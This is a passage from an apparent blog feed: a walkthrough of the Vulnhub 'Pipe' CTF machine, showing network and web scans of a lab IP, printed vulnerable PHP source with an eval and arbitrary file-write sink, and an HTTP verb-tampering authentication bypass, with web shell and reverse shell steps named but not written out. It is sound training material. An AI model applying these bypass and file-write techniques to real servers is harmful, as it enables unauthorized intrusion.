</span></code></pre></td></tr></table></div></figure></p>

<p>Cheers to <a href="http://www.mogozobo.com/">Xerubus</a>, really funny and enjoyable challenge with tons of knowledge. Greate job!!</p>

<!--- Reference -->



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[[Vulnhub] Pipe]]></title>
    <link href="http://f4l13n5n0w.github.io/blog/2015/11/23/vulnhub-pipe/"/>
    <updated>2015-11-23T05:43:52-05:00</updated>
    <id>http://f4l13n5n0w.github.io/blog/2015/11/23/vulnhub-pipe</id>
    <content type="html"><![CDATA[<p><strong>/dev/random: Pipe</strong> is another one CTF challange in the series <strong>/dev/random</strong>, which is created by <a href="https://www.vulnhub.com/author/sagi-,36/">Sagi-</a>.</p>

<p>More information and OVA file download please check <a href="https://www.vulnhub.com/entry/devrandom-pipe,124/">here</a>.</p>

<!-- more -->


<h2>Attacker &amp; Target</h2>

<p>Attacker: Kali2 Linux (<em>10.1.1.130/24</em>)</p>

<p>Target: The Wall: 1 (<em>10.1.1.143/24</em>)</p>

<h2>Vulnerability &amp; Exploit</h2>

<ul>
<li>Basic Authentication bypass: <a href="https://bz.apache.org/bugzilla/show_bug.cgi?id=28778" title="HTTP method tamper in 2004">HTTP method tamper</a></li>
<li>Backup file <code>Log.php.BAK</code> exists in the server and source code disclosure</li>
<li>Analyze and found the source code is able to upload arbitrary file, which can be used to upload web shell</li>
<li>After got a shell, enumerating and find the vulnerablity <code>tar with wildcard *</code> can be exploited to ROOT</li>
</ul>


<h2>Method</h2>

<ul>
<li>Scanned the network to discover the target server [<font color="FF8000">arp-scan</font>]</li>
<li>Port scanned the target to discover running services and open ports [<font color="FF8000">masscan</font> &amp;&amp; <font color="FF8000">nmap</font>]</li>
<li>Using HTTP method tamper to bypass the Basic Authentication on resource page <code>index.php</code> [<font color="FF8000">nmap with script</font>]</li>
<li>Brute force scan to find hidden path [<font color="FF8000">dirbuster</font>]</li>
<li>Found and analysed source code in finding files <code>php.js</code> and <code>Log.php.BAK</code>, as a result, find a file upload function.</li>
<li>Write web shell to target server and use <code>nc</code> to get a reverse shell [<font color="FF8000">nc</font>]</li>
<li>Enumeration and exploit <code>tar with wildcard</code> vulnerability to get ROOT</li>
</ul>


<h2>Tools</h2>

<p>All the tools used here can be found in Kali Linux</p>

<ul>
<li><a href="http://linux.die.net/man/1/arp-scan">arp-scan</a></li>
<li><a href="https://github.com/robertdavidgraham/masscan">masscan</a></li>
<li><a href="https://nmap.org/">nmap</a></li>
<li><a href="https://www.mozilla.org/en-US/firefox/new/">firefox</a></li>
<li><a href="https://cirt.net/Nikto2">nikto</a></li>
<li><a href="https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project">dirbuster</a></li>
<li><a href="https://portswigger.net/burp/">burp suite</a></li>
<li><a href="http://linux.die.net/man/1/nc">nc</a></li>
</ul>


<h2>Walkthrough</h2>

<p>Using <code>arp-scan</code> as routine to detect the target&rsquo;s IP address (10.1.1.143 in this case).</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# arp-scan -l
</span><span class='line'>Interface: eth0, datalink <span class="nb">type</span>: EN10MB <span class="o">(</span>Ethernet<span class="o">)</span>
</span><span class='line'>Starting arp-scan 1.9 with <span class="m">256</span> hosts <span class="o">(</span>&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://www.nta-monitor.com/tools/arp-scan/&quot;</span>&gt;http://www.nta-monitor.com/tools/arp-scan/&lt;/a&gt;<span class="o">)</span>
</span><span class='line'>10.1.1.1    00:50:56:c0:00:08   VMware, Inc.
</span><span class='line'>10.1.1.2    00:50:56:fd:d1:6b   VMware, Inc.
</span><span class='line'>10.1.1.143  00:0c:29:64:39:5e   VMware, Inc.
</span><span class='line'>10.1.1.254  00:50:56:f5:74:35   VMware, Inc.&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;4 packets received by filter, <span class="m">0</span> packets dropped by kernel
</span><span class='line'>Ending arp-scan 1.9: <span class="m">256</span> hosts scanned in 2.657 seconds <span class="o">(</span>96.35 hosts/sec<span class="o">)</span>. <span class="m">4</span> responded
</span></code></pre></td></tr></table></div></figure></p>

<p>10.1.1.143 is our Target!</p>

<p>Then run <code>masscan</code> to detect opening ports on the target (masscan is much faster than nmap when doing a full ports scan, so here I use it to make a full scan and then use nmap to do a deep scan on target ports).</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# masscan -p1-65535 10.1.1.143/32 <span class="p">&amp;</span>ndash<span class="p">;</span><span class="nv">rate</span><span class="o">=</span>10000&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Starting masscan 1.0.3 <span class="o">(</span>&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://bit.ly/14GZzcT&quot;</span>&gt;http://bit.ly/14GZzcT&lt;/a&gt;<span class="o">)</span> at 2015-11-21 00:47:26 GMT
</span><span class='line'> <span class="p">&amp;</span>ndash<span class="p">;</span> forced options: -sS -Pn -n <span class="p">&amp;</span>ndash<span class="p">;</span>randomize-hosts -v <span class="p">&amp;</span>ndash<span class="p">;</span>send-eth
</span><span class='line'>Initiating SYN Stealth Scan
</span><span class='line'>Scanning <span class="m">1</span> hosts <span class="o">[</span><span class="m">65535</span> ports/host<span class="o">]</span>
</span><span class='line'>Discovered open port 40117/tcp on 10.1.1.143                                 &lt;br/&gt;
</span><span class='line'>Discovered open port 111/tcp on 10.1.1.143                                   &lt;br/&gt;
</span><span class='line'>Discovered open port 80/tcp on 10.1.1.143                                    &lt;br/&gt;
</span><span class='line'>Discovered open port 22/tcp on 10.1.1.143
</span></code></pre></td></tr></table></div></figure></p>

<p>There are 4 ports (22, 80, 111, 40117) detected by <code>masscan</code>, then I run <code>nmap</code> to do a deeper service scan.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;h1&gt;Nmap 6.49BETA5 scan initiated Tue Nov <span class="m">17</span> 05:50:42 <span class="m">2015</span> as: nmap -sV -v -O -A -T4 -p80,22,111,44161 -oN 10.1.1.143_nmap.txt 10.1.1.143&lt;/h1&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Nmap scan report <span class="k">for</span> 10.1.1.143
</span><span class='line'>Host is up <span class="o">(</span>0.00035s latency<span class="o">)</span>.
</span><span class='line'>PORT      STATE SERVICE VERSION
</span><span class='line'>22/tcp    open  ssh     OpenSSH 6.7p1 Debian <span class="m">5</span> <span class="o">(</span>protocol 2.0<span class="o">)</span>
</span><span class='line'><span class="p">|</span> ssh-hostkey:
</span><span class='line'><span class="p">|</span>   <span class="m">1024</span> 16:48:50:89:e7:c9:1f:90:ff:15:d8:3e:ce:ea:53:8f <span class="o">(</span>DSA<span class="o">)</span>
</span><span class='line'><span class="p">|</span>   <span class="m">2048</span> ca:f9:85:be:d7:36:47:51:4f:e6:27:84:72:eb:e8:18 <span class="o">(</span>RSA<span class="o">)</span>
</span><span class='line'><span class="p">|</span>&lt;em&gt;  <span class="m">256</span> d8:47:a0:87:84:b2:eb:f5:be:fc:1c:f1:c9:7f:e3:52 <span class="o">(</span>ECDSA<span class="o">)</span>
</span><span class='line'>80/tcp    open  http    Apache httpd
</span><span class='line'><span class="p">|</span> http-auth:
</span><span class='line'><span class="p">|</span> HTTP/1.1 <span class="m">401</span> Unauthorized
</span><span class='line'><span class="p">|</span>&lt;/em&gt;  Basic <span class="nv">realm</span><span class="o">=</span>index.php
</span><span class='line'><span class="p">|</span>&lt;em&gt;http-methods: No Allow or Public header in OPTIONS response <span class="o">(</span>status code 401<span class="o">)</span>
</span><span class='line'><span class="p">|</span>&lt;/em&gt;http-server-header: Apache
</span><span class='line'><span class="p">|</span>&lt;em&gt;http-title: <span class="m">401</span> Unauthorized
</span><span class='line'>111/tcp   open  rpcbind 2-4 <span class="o">(</span>RPC <span class="c">#100000)</span>
</span><span class='line'><span class="p">|</span> rpcinfo:
</span><span class='line'><span class="p">|</span>   program version   port/proto  service
</span><span class='line'><span class="p">|</span>   <span class="m">100000</span>  2,3,4        111/tcp  rpcbind
</span><span class='line'><span class="p">|</span>   <span class="m">100000</span>  2,3,4        111/udp  rpcbind
</span><span class='line'><span class="p">|</span>   <span class="m">100024</span>  <span class="m">1</span>          37301/udp  status
</span><span class='line'><span class="p">|</span>&lt;/em&gt;  <span class="m">100024</span>  <span class="m">1</span>          44161/tcp  status
</span><span class='line'>44161/tcp open  status  <span class="m">1</span> <span class="o">(</span>RPC <span class="c">#100024)</span>
</span><span class='line'>MAC Address: 00:0C:29:64:39:5E <span class="o">(</span>VMware<span class="o">)</span>
</span><span class='line'>Warning: OSScan results may be unreliable because we could not find at least <span class="m">1</span> open and <span class="m">1</span> closed port
</span><span class='line'>Device <span class="nb">type</span>: general purpose
</span><span class='line'>Running: Linux 3.X
</span><span class='line'>OS CPE: cpe:/o:linux:linux_kernel:3
</span><span class='line'>OS details: Linux 3.2 - 3.19
</span><span class='line'>Uptime guess: 0.001 days <span class="o">(</span>since Tue Nov <span class="m">17</span> 05:49:56 2015<span class="o">)</span>
</span><span class='line'>Network Distance: <span class="m">1</span> hop
</span><span class='line'><span class="p">&amp;</span>hellip<span class="p">;</span> turncate <span class="p">&amp;</span>hellip<span class="p">;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>Due to port 80 is open (providing web service on the target server), run <code>Nikto</code> to do a web vuln scan:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/the_pipe# nikto -host 10.1.1.143&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;h2&gt;- Nikto v2.1.6&lt;/h2&gt;
</span><span class='line'>
</span><span class='line'>&lt;ul&gt;
</span><span class='line'>&lt;li&gt;Target IP:          10.1.1.143&lt;/li&gt;
</span><span class='line'>&lt;li&gt;Target Hostname:    10.1.1.143&lt;/li&gt;
</span><span class='line'>&lt;li&gt;Target Port:        80
</span><span class='line'>
</span><span class='line'>&lt;ul&gt;
</span><span class='line'>&lt;li&gt;Start Time:         2015-11-20 19:53:42 <span class="o">(</span>GMT-5<span class="o">)</span>&lt;/li&gt;
</span><span class='line'>&lt;/ul&gt;
</span><span class='line'>&lt;/li&gt;
</span><span class='line'>&lt;/ul&gt;
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>&lt;hr /&gt;
</span><span class='line'>
</span><span class='line'>&lt;ul&gt;
</span><span class='line'>&lt;li&gt;Server: Apache&lt;/li&gt;
</span><span class='line'>&lt;li&gt;The anti-clickjacking X-Frame-Options header is not present.&lt;/li&gt;
</span><span class='line'>&lt;li&gt;The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS&lt;/li&gt;
</span><span class='line'>&lt;li&gt;The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME <span class="nb">type</span>&lt;/li&gt;
</span><span class='line'>&lt;li&gt;/ - Requires Authentication <span class="k">for</span> realm <span class="p">&amp;</span>lsquo<span class="p">;</span>index.php<span class="p">&amp;</span>rsquo<span class="p">;</span>&lt;/li&gt;
</span><span class='line'>&lt;li&gt;No CGI Directories found <span class="o">(</span>use <span class="p">&amp;</span>lsquo<span class="p">;</span>-C all<span class="p">&amp;</span>rsquo<span class="p">;</span> to force check all possible <span class="nb">dirs</span><span class="o">)</span>&lt;/li&gt;
</span><span class='line'>&lt;li&gt;/ - Requires Authentication <span class="k">for</span> realm <span class="p">&amp;</span>lsquo<span class="p">;</span>index.php<span class="p">&amp;</span>rsquo<span class="p">;</span>&lt;/li&gt;
</span><span class='line'>&lt;li&gt;IP address found in the <span class="p">&amp;</span>lsquo<span class="p">;</span>location<span class="p">&amp;</span>rsquo<span class="p">;</span> header. The IP is <span class="p">&amp;</span>ldquo<span class="p">;</span>127.0.1.1<span class="p">&amp;</span>rdquo<span class="p">;</span>.&lt;/li&gt;
</span><span class='line'>&lt;li&gt;OSVDB-630: IIS may reveal its internal or real IP in the Location header via a request to the /images directory. The value is <span class="p">&amp;</span>ldquo<span class="p">;</span>&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://127.0.1.1/images/&quot;</span>&gt;http://127.0.1.1/images/&lt;/a&gt;<span class="p">&amp;</span>rdquo<span class="p">;</span>.
</span><span class='line'><span class="p">&amp;</span>hellip<span class="p">;</span> turncat <span class="p">&amp;</span>hellip<span class="p">;</span>&lt;/li&gt;
</span><span class='line'>&lt;li&gt;/ - Requires Authentication <span class="k">for</span> realm <span class="p">&amp;</span>lsquo<span class="p">;</span>index.php<span class="p">&amp;</span>rsquo<span class="p">;</span>
</span><span class='line'><span class="p">&amp;</span>hellip<span class="p">;</span> turncat <span class="p">&amp;</span>hellip<span class="p">;</span>&lt;/li&gt;
</span><span class='line'>&lt;li&gt;OSVDB-3268: /images/: Directory indexing found.&lt;/li&gt;
</span><span class='line'>&lt;li&gt;/ - Requires Authentication <span class="k">for</span> realm <span class="p">&amp;</span>lsquo<span class="p">;</span>index.php<span class="p">&amp;</span>rsquo<span class="p">;</span>&lt;/li&gt;
</span><span class='line'>&lt;li&gt;OSVDB-3268: /images/?pattern<span class="o">=</span>/etc/*<span class="p">&amp;</span>amp<span class="p">;</span><span class="nv">sort</span><span class="o">=</span>name: Directory indexing found.&lt;/li&gt;
</span><span class='line'>&lt;li&gt;/ - Requires Authentication <span class="k">for</span> realm <span class="p">&amp;</span>lsquo<span class="p">;</span>index.php<span class="p">&amp;</span>rsquo<span class="p">;</span>&lt;/li&gt;
</span><span class='line'>&lt;li&gt;7667 requests: <span class="m">0</span> error<span class="o">(</span>s<span class="o">)</span> and <span class="m">7</span> item<span class="o">(</span>s<span class="o">)</span> reported on remote host
</span><span class='line'>
</span><span class='line'>&lt;ul&gt;
</span><span class='line'>&lt;li&gt;End Time:           2015-11-20 19:54:03 <span class="o">(</span>GMT-5<span class="o">)</span> <span class="o">(</span><span class="m">21</span> seconds<span class="o">)</span>&lt;/li&gt;
</span><span class='line'>&lt;/ul&gt;
</span><span class='line'>&lt;/li&gt;
</span><span class='line'>&lt;/ul&gt;
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>&lt;hr /&gt;
</span><span class='line'>
</span><span class='line'>&lt;ul&gt;
</span><span class='line'>&lt;li&gt;1 host<span class="o">(</span>s<span class="o">)</span> tested
</span></code></pre></td></tr></table></div></figure></li>
</ul>


<p>Nikto scan could not find any suspicious footprint, then I try Dirbuster to brute force hidden folders / files:</p>

<p>Two source code files discovered in folder &lsquo;scriptz&rsquo;:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>/scriptz/log.php.BAK
</span><span class='line'>/scriptz/php.js</span></code></pre></td></tr></table></div></figure></p>

<p>Analyze the first file &ldquo;log.php.BAK&rdquo;, this is a backup of &ldquo;log.php&rdquo; obviously, so if I can find / run &ldquo;log.php&rdquo; I would be able to upload shell to the target server:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">\</span><span class="o">?</span><span class="nx">php</span>
</span><span class='line'><span class="k">class</span> <span class="nc">Log</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="k">public</span> <span class="nv">$filename</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;;</span>
</span><span class='line'>    <span class="k">public</span> <span class="nv">$data</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;;</span><span class="o">&lt;/</span><span class="nx">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="nx">pre</span><span class="o">&gt;&lt;</span><span class="nx">code</span><span class="o">&gt;</span><span class="k">public</span> <span class="k">function</span> <span class="nf">__construct</span><span class="p">()</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="nv">$this</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">filename</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span><span class='line'><span class="nv">$this</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">data</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">public</span> <span class="k">function</span> <span class="nf">PrintLog</span><span class="p">()</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="nv">$pre</span> <span class="o">=</span> <span class="s2">&quot;[LOG]&quot;</span><span class="p">;</span>
</span><span class='line'><span class="nv">$now</span> <span class="o">=</span> <span class="nb">date</span><span class="p">(</span><span class="s1">&#39;Y-m-d H:i:s&#39;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="nv">$str</span> <span class="o">=</span> <span class="s1">&#39;$pre - $now - $this-&amp;gt;data&#39;</span><span class="p">;</span>
</span><span class='line'>    <span class="k">eval</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\$</span><span class="s2">str = </span><span class="se">\&quot;</span><span class="si">$str\</span><span class="s2">&quot;</span><span class="p">;</span><span class="s2">&quot;);</span>
</span><span class='line'><span class="s2">    echo </span><span class="si">$str</span><span class="s2">;</span>
</span><span class='line'><span class="s2">}</span>
</span><span class='line'>
</span><span class='line'><span class="s2">public function __destruct()</span>
</span><span class='line'><span class="s2">{</span>
</span><span class='line'><span class="s2">file_put_contents(</span><span class="si">$this</span><span class="s2">-&amp;gt;filename, </span><span class="si">$this</span><span class="s2">-&amp;gt;data, FILE_APPEND);           // &amp;lt;== Here we can write any code into any file</span>
</span><span class='line'><span class="s2">}</span>
</span><span class='line'><span class="s2">&lt;/code&gt;&lt;/pre&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="s2">&lt;p&gt;}</span>
</span><span class='line'><span class="s2">\?&gt;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>Both <code>nmap</code> and <code>nikto</code> results show us that <code>index.php</code> exists under the root path and it requires Basic authentication to access this page.</p>

<p>There is one method can be used to test if the authentication can be bypassed called <code>http method tamper</code> (first appears in 2004, <a href="https://bz.apache.org/bugzilla/show_bug.cgi?id=28778">https://bz.apache.org/bugzilla/show_bug.cgi?id=28778</a>) and Nmap provides a <a href="https://nmap.org/nsedoc/scripts/http-method-tamper.html" title="NMAP script: HTTP method tamper">script</a> to auto-test it.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/the_pipe# nmap -p <span class="m">80</span> <span class="p">&amp;</span>ndash<span class="p">;</span>script http-method-tamper <span class="p">&amp;</span>ndash<span class="p">;</span>script-args <span class="p">&amp;</span>lsquo<span class="p">;</span>http-method-tamper.paths<span class="o">={</span>/index.php<span class="o">}</span><span class="p">&amp;</span>rsquo<span class="p">;</span> 10.1.1.143&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Starting Nmap 6.49BETA5 <span class="o">(</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;https://nmap.org&quot;</span>&gt;https://nmap.org&lt;/a&gt; <span class="o">)</span> at 2015-11-20 21:57 EST
</span><span class='line'>Nmap scan report <span class="k">for</span> 10.1.1.143
</span><span class='line'>Host is up <span class="o">(</span>0.00024s latency<span class="o">)</span>.
</span><span class='line'>PORT   STATE SERVICE
</span><span class='line'>80/tcp open  http
</span><span class='line'><span class="p">|</span> http-method-tamper:
</span><span class='line'><span class="p">|</span>   VULNERABLE:
</span><span class='line'><span class="p">|</span>   Authentication bypass by HTTP verb tampering
</span><span class='line'><span class="p">|</span>     State: VULNERABLE <span class="o">(</span>Exploitable<span class="o">)</span>
</span><span class='line'><span class="p">|</span>       This web server contains password protected resources vulnerable to authentication bypass
</span><span class='line'><span class="p">|</span>       vulnerabilities via HTTP verb tampering. This is often found in web servers that only limit access to the
</span><span class='line'><span class="p">|</span>        common HTTP methods and in misconfigured .htaccess files.
</span><span class='line'><span class="p">|</span>            &lt;br/&gt;
</span><span class='line'><span class="p">|</span>     Extra information:
</span><span class='line'><span class="p">|</span>     &lt;br/&gt;
</span><span class='line'><span class="p">|</span>   URIs suspected to be vulnerable to HTTP verb tampering:
</span><span class='line'><span class="p">|</span>     /index.php <span class="o">[</span>POST<span class="o">]</span>
</span><span class='line'><span class="p">|</span> &lt;br/&gt;
</span><span class='line'><span class="p">|</span>     References:
</span><span class='line'><span class="p">|</span>       &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;https://www.owasp.org/index.php/Testing_for_HTTP_Methods_and_XST_%28OWASP-CM-008%29&quot;</span>&gt;https://www.owasp.org/index.php/Testing_for_HTTP_Methods_and_XST_%28OWASP-CM-008%29&lt;/a&gt;
</span><span class='line'><span class="p">|</span>       &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://capec.mitre.org/data/definitions/274.html&quot;</span>&gt;http://capec.mitre.org/data/definitions/274.html&lt;/a&gt;
</span><span class='line'><span class="p">|</span>       &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://www.imperva.com/resources/glossary/http_verb_tampering.html&quot;</span>&gt;http://www.imperva.com/resources/glossary/http_verb_tampering.html&lt;/a&gt;
</span><span class='line'><span class="p">|</span>_      &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://www.mkit.com.ar/labs/htexploit/&quot;</span>&gt;http://www.mkit.com.ar/labs/htexploit/&lt;/a&gt;
</span><span class='line'>MAC Address: 00:0C:29:64:39:5E <span class="o">(</span>VMware<span class="o">)</span>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 0.91 seconds
</span></code></pre></td></tr></table></div></figure></p>

<p>It is vulnerable to POST method, so now I start up burp proxy to bypass the authentication and got the protected page:</p>

<p><img class="left" src="/downloads/pipe/1.png"></p>

<p>Bingo! Next we will check the source code:</p>

<p><figure class='code'><figcaption><span>index.php.txt  (index.php.txt)</span> <a href='/downloads/code/index.php.txt'>download</a></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;</span><span class="nx">html</span><span class="o">&gt;</span>
</span><span class='line'><span class="o">&lt;</span><span class="nx">head</span><span class="o">&gt;</span>
</span><span class='line'><span class="o">&lt;</span><span class="nx">meta</span> <span class="nx">http</span><span class="o">-</span><span class="nx">equiv</span><span class="o">=</span><span class="s2">&quot;Content-Type&quot;</span> <span class="nx">content</span><span class="o">=</span><span class="s2">&quot;text/html; charset=UTF-8&quot;</span><span class="o">&gt;</span>
</span><span class='line'><span class="o">&lt;</span><span class="nx">script</span> <span class="nx">src</span><span class="o">=</span><span class="s2">&quot;scriptz/php.js&quot;</span><span class="o">&gt;&lt;/</span><span class="nx">script</span><span class="o">&gt;</span>
</span><span class='line'><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span>
</span><span class='line'><span class="k">function</span> <span class="nf">submit_form</span><span class="p">()</span> <span class="p">{</span>
